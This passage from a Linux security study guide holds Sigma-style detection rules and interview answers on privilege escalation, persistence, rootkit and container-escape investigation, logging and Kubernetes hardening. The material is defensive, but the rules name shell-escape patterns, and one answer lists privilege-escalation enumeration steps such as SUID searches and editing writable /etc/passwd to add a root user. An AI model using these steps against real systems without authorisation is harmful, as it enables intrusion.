status: stable
description: Detects execution of SUID binaries with shell escape potential
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: 'EXECVE'
        a0|contains:
            - '/usr/bin/find'
            - '/usr/bin/vim'
            - '/usr/bin/nmap'
            - '/usr/bin/less'
            - '/usr/bin/awk'
        a1|contains:
            - '-exec'
            - ':!/bin'
            - '!sh'
            - 'system('
    condition: selection
level: high
tags:
    - attack.privilege_escalation
    - attack.t1548.001

---
# Suspicious Sudo Execution
title: Suspicious Sudo Command Execution
id: e9f0a1b2-4c5d-6e7f-8a9b-0c1d2e3f4a5b
status: stable
description: Detects potentially malicious sudo command usage
logsource:
    product: linux
    service: syslog
detection:
    selection:
        syslog_identifier: 'sudo'
    keywords:
        - 'COMMAND=/bin/sh'
        - 'COMMAND=/bin/bash'
        - 'COMMAND=/usr/bin/python'
        - 'COMMAND=/usr/bin/perl'
    condition: selection and keywords
level: medium

---
# Cron Job Persistence
title: Suspicious Cron Job Creation
id: f0a1b2c3-5d6e-7f8a-9b0c-1d2e3f4a5b6c
status: stable
description: Detects creation of cron jobs with suspicious commands
logsource:
    product: linux
    service: auditd
detection:
    selection:
        key: 'cron_changes'
        syscall:
            - 'openat'
            - 'write'
    condition: selection
level: medium

---
# SSH Authorized Keys Modification
title: SSH Authorized Keys Modification
id: a1b2c3d4-6e7f-8a9b-0c1d-2e3f4a5b6c7d
status: stable
description: Detects modification of SSH authorized_keys files
logsource:
    product: linux
    service: auditd
detection:
    selection:
        key: 'root_ssh'
    selection_file:
        name|contains: 'authorized_keys'
    condition: selection or selection_file
level: high
tags:
    - attack.persistence
    - attack.t1098.004

---
# Kernel Module Loading
title: Kernel Module Loading
id: b2c3d4e5-7f8a-9b0c-1d2e-3f4a5b6c7d8e
status: stable
description: Detects loading of kernel modules (potential rootkit)
logsource:
    product: linux
    service: auditd
detection:
    selection:
        key: 'modules'
    selection_syscall:
        syscall:
            - 'init_module'
            - 'finit_module'
    condition: selection or selection_syscall
level: high
tags:
    - attack.persistence
    - attack.t1547.006
```

---

## Interview Questions - Linux Security

### Foundational Questions

**1. How do you find and assess privilege escalation vectors on a Linux system?**

```
SYSTEMATIC APPROACH:

1. SUID/SGID Binaries
   find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
   - Check against GTFOBins
   - Look for custom SUID binaries

2. Sudo Configuration
   sudo -l
   - Check for NOPASSWD entries
   - Check for wildcards
   - Check for writable scripts

3. Capabilities
   getcap -r / 2>/dev/null
   - cap_setuid, cap_dac_override = root

4. Cron Jobs
   - System: /etc/crontab, /etc/cron.d/
   - User: crontab -l
   - Check for writable scripts
   - Check for PATH manipulation

5. Kernel Version
   uname -a
   - Check for known exploits (Dirty Pipe, etc.)

6. Writable Files
   - /etc/passwd (add root user)
   - /etc/shadow (modify hashes)
   - /etc/sudoers (add permissions)

7. Configuration Issues
   - NFS no_root_squash
   - Docker group membership
   - Weak file permissions

TOOLS:
├── LinPEAS
├── Linux Exploit Suggester
├── linuxprivchecker
└── Linux Smart Enumeration
```

**2. Describe the different persistence mechanisms on Linux and how to detect them.**

```
USER-LEVEL PERSISTENCE:
├── Shell profiles: ~/.bashrc, ~/.profile, ~/.bash_profile
│   Detection: Compare against known-good, audit file changes
├── SSH keys: ~/.ssh/authorized_keys
│   Detection: Audit changes, monitor file writes
├── Cron jobs: crontab -l
│   Detection: Audit cron changes, compare schedules
└── XDG autostart: ~/.config/autostart/
│   Detection: Monitor directory for new .desktop files

SYSTEM-LEVEL PERSISTENCE:
├── Systemd services: /etc/systemd/system/
│   Detection: auditd rules, compare against baseline
├── Init scripts: /etc/init.d/, /etc/rc.local
│   Detection: File integrity monitoring
├── Cron: /etc/crontab, /etc/cron.d/
│   Detection: auditd, file hashing
├── PAM modules: /lib/security/
│   Detection: Binary analysis, hash comparison
├── LD_PRELOAD: /etc/ld.so.preload
│   Detection: Monitor file, should rarely change
└── Kernel modules: /lib/modules/
│   Detection: Module whitelisting, audit loading

DETECTION STRATEGY:
1. File integrity monitoring (AIDE, Tripwire, OSSEC)
2. Auditd rules for persistence locations
3. Regular baseline comparisons
4. Monitor for new scheduled tasks
5. Check for new services/units
```

**3. What logs would you examine during a Linux security investigation?**

```
AUTHENTICATION:
├── /var/log/auth.log (Debian/Ubuntu)
├── /var/log/secure (RHEL/CentOS)
├── /var/log/wtmp (last command)
├── /var/log/btmp (lastb command)
└── SSH logs in auth.log/secure

SYSTEM:
├── /var/log/syslog or /var/log/messages
├── /var/log/kern.log
├── journalctl (systemd)
└── /var/log/audit/audit.log (if auditd enabled)

APPLICATION:
├── /var/log/apache2/ or /var/log/httpd/
├── /var/log/nginx/
├── Database logs
└── Custom application logs

COMMAND HISTORY:
├── ~/.bash_history (per user)
├── ~/.zsh_history
└── /root/.bash_history

KEY THINGS TO LOOK FOR:
├── Failed login attempts (brute force)
├── Successful logins from unusual IPs
├── Sudo command execution
├── User account changes
├── Service restarts/installations
├── Cron job execution
└── Error messages around incident time
```

**4. How would you harden a Linux server?**

```
SSH HARDENING:
├── Disable root login
├── Key-only authentication
├── Limit users with AllowUsers
├── Change default port (security through obscurity)
├── Use fail2ban
└── Configure strong ciphers

SYSTEM HARDENING:
├── Keep system updated
├── Remove unnecessary packages/services
├── Configure firewall (iptables/nftables/ufw)
├── Enable auditd with comprehensive rules
├── Enable SELinux/AppArmor
└── Configure sysctl security parameters

ACCOUNT HARDENING:
├── Strong password policy (PAM)
├── Account lockout after failures
├── Disable unused accounts
├── Restrict sudo access
├── Remove unnecessary SUID bits
└── Restrict cron/at access

FILE SYSTEM:
├── Proper permissions on sensitive files
├── Noexec on /tmp, /var/tmp (if possible)
├── File integrity monitoring
└── Encrypt sensitive data at rest

NETWORK:
├── Disable unnecessary services
├── Use TCP wrappers (/etc/hosts.allow, deny)
├── Configure firewall rules (default deny)
└── Network segmentation

MONITORING:
├── Centralized logging
├── SIEM integration
├── Host-based IDS (OSSEC, Wazuh)
└── Regular security audits
```

### Scenario-Based Questions

**5. You discover a cron job running a script every minute that you didn't create. Walk through your investigation.**

```
IMMEDIATE ACTIONS:
1. Document: Screenshot, copy cron entry
2. Check script contents WITHOUT executing
3. Identify who created it (timestamps, ownership)
4. Assess if currently causing harm

INVESTIGATION:
1. Examine the cron entry
   cat /etc/crontab
   cat /etc/cron.d/<suspicious>
   crontab -l -u root

2. Analyze the script
   cat /path/to/script.sh
   strings /path/to/script.sh
   file /path/to/script.sh
   stat /path/to/script.sh

3. Check execution history
   grep "<script_name>" /var/log/syslog
   journalctl | grep "<script_name>"
   ausearch -f /path/to/script

4. Network connections
   Review network connections from script
   Check for C2 communication

5. Timeline analysis
   When was script created?
   When was cron job added?
   Correlate with other events

CONTAINMENT:
1. Remove cron job (or comment out)
2. Quarantine script (don't delete yet)
3. Check for other persistence
4. Monitor for re-creation

POST-INCIDENT:
1. Root cause analysis
2. Scope determination
3. Check other systems
4. Implement detection
```

**6. How would you detect and respond to a container escape attempt?**

```
DETECTION:

1. Monitor container configurations
   - Privileged mode usage
   - Host path mounts
   - Docker socket mounts
   - Dangerous capabilities

2. Host-level monitoring
   - Process creation from container namespaces
   - Attempts to access /dev/sda, etc.
   - Mount operations from containers
   - Network namespace changes

3. Audit rules
   -w /var/run/docker.sock -p wa -k docker_socket
   -a always,exit -F arch=b64 -S mount -k container_escape

4. Behavior indicators
   - Container accessing host filesystem
   - Unexpected child processes of containerd
   - nsenter/unshare usage

RESPONSE:

1. Isolate affected container
   docker stop <container>
   docker network disconnect

2. Preserve evidence
   docker export <container> > container_backup.tar
   docker logs <container> > container_logs.txt
   docker inspect <container> > container_config.json

3. Host investigation
   - Check for persistence mechanisms
   - Review all running containers
   - Check host for compromise indicators

4. Root cause
   - Why was container privileged?
   - Who created it?
   - Legitimate use case?

PREVENTION:
├── No privileged containers
├── No docker socket mounting
├── Use Pod Security Standards
├── Runtime security (Falco, Sysdig)
├── Image scanning
└── Least privilege capabilities
```

**7. Explain how you would investigate a potential rootkit on a Linux system.**

```
ROOTKIT INDICATORS:
├── Hidden processes (ps vs /proc enumeration)
├── Hidden files (ls vs directory iteration)
├── Hidden network connections
├── Modified system binaries
├── Unusual kernel modules
├── Hooked syscalls

INVESTIGATION APPROACH:

1. Use trusted tools (boot from clean media)
   # Mount suspect drive read-only
   mount -o ro /dev/sda1 /mnt/suspect

2. Binary verification
   rpm -Va (RHEL) or debsums (Debian)
   Compare hashes against known-good

3. Kernel module analysis
   lsmod
   cat /proc/modules
   Check module signatures

4. Process comparison
   Compare: ps aux vs direct /proc enumeration
   for pid in /proc/[0-9]*; do echo $pid; done

5. Network comparison
   Compare: netstat vs /proc/net/tcp parsing
   Look for hidden connections

6. File system analysis
   Compare ls output vs directory iteration
   Check for hidden entries in /proc

7. Memory analysis
   Dump memory with LiME
   Analyze with Volatility
   Check for kernel hooks

8. Rootkit detection tools
   chkrootkit
   rkhunter
   unhide (process/port)

RESPONSE:
1. Full system reimaging recommended
2. If cleaning attempted:
   - Replace all binaries from known-good source
   - Remove malicious kernel modules
   - Restore clean kernel
3. Forensic preservation before cleanup
```

**8. How would you set up comprehensive logging for a Linux environment?**

```
AUDITD CONFIGURATION:
├── Enable auditd service
├── Comprehensive rules (see Auditd section)
├── Configure log retention
└── Forward to SIEM

RSYSLOG/SYSLOG-NG:
├── Configure remote logging
│   # /etc/rsyslog.conf
│   *.* @@logserver:514    # TCP
│   *.* @logserver:514     # UDP
├── Structured logging
├── Log separation by facility
└── TLS encryption for transit

JOURNALD:
├── Configure persistent storage
│   # /etc/systemd/journald.conf
│   Storage=persistent
├── Forward to syslog
│   ForwardToSyslog=yes
└── Retention settings

WHAT TO LOG:
├── All authentication events
├── Command execution (auditd execve)
├── Privilege escalation
├── Network connections
├── File system changes to critical paths
├── Service start/stop
├── User/group modifications
└── Security tool events

SIEM INTEGRATION:
├── Parse and normalize logs
├── Create detection rules
├── Build dashboards
├── Configure alerts
└── Retain logs per compliance

LOG PROTECTION:
├── Write-once storage
├── Log signing/integrity
├── Separate log server
├── Access control to logs
└── Backup logs
```

### Advanced Questions

**9. Describe how you would detect lateral movement in a Linux environment.**

```
INDICATORS OF LATERAL MOVEMENT:

SSH-based:
├── SSH to unusual hosts
├── Key-based auth from new keys
├── Agent forwarding abuse
├── SSH tunneling

Detection:
├── Monitor auth.log for SSH patterns
├── Track SSH connections per user
├── Alert on first-time connections
├── Monitor SSH agent socket access

Network-based:
├── Unusual internal connections
├── Remote command execution (SSH, Ansible)
├── File transfers (SCP, SFTP, rsync)
├── Network scans from internal hosts

Detection:
├── Baseline internal traffic patterns
├── Alert on port scanning behavior
├── Monitor file transfer tools
├── Network segmentation alerts

Credential-based:
├── Password spraying
├── Hash passing (uncommon on Linux)
├── Key theft and reuse
├── Service account abuse

Detection:
├── Failed auth across multiple systems
├── Unusual service account activity
├── Credential access from unexpected locations

QUERY EXAMPLES:

# SSH lateral movement
index=linux auth.log
| rex "Accepted (?<auth_method>\S+) for (?<user>\S+) from (?<src_ip>\S+)"
| stats dc(host) as unique_hosts values(host) by user, src_ip
| where unique_hosts > 3

# First-time SSH connections
index=linux auth.log Accepted
| eval user_host=user."@".host
| eventstats earliest(_time) as first_seen by user_host
| where first_seen > relative_time(now(), "-24h")
```

**10. How would you approach securing a Kubernetes cluster?**

```
CLUSTER SECURITY:

API Server:
├── Enable RBAC
├── Disable anonymous auth
├── Use TLS for all communication
├── Enable audit logging
├── Network policy for API access
└── Enable admission controllers

RBAC:
├── Least privilege principle
├── No cluster-admin for users
├── Service account per workload
├── Restrict service account token mounting
└── Regular RBAC audits

Network:
├── Network policies (default deny)
├── Segment by namespace
├── Restrict egress
├── Service mesh for mTLS
└── CNI with security features

Pod Security:
├── Pod Security Standards (restricted)
├── No privileged containers
├── Run as non-root
├── Read-only root filesystem
├── Drop all capabilities
├── Seccomp profiles
└── AppArmor/SELinux

Secrets Management:
├── External secrets store (Vault)
├── Encrypt secrets at rest
├── RBAC for secrets
├── Rotate secrets regularly
└── Never hardcode secrets

Image Security:
├── Vulnerability scanning
├── Signed images
├── Private registry
├── Base image standards
└── No latest tag

Runtime:
├── Falco for behavior detection
├── Runtime scanning
├── Pod security monitoring
├── Network monitoring
└── Resource limits

DETECTION:
├── Audit logs to SIEM
├── Falco rules for attacks
├── Network anomaly detection
├── Pod creation monitoring
└── RBAC change alerts
```

---

**Next: [11_CLOUD_SECURITY.md](./11_CLOUD_SECURITY.md) -->**
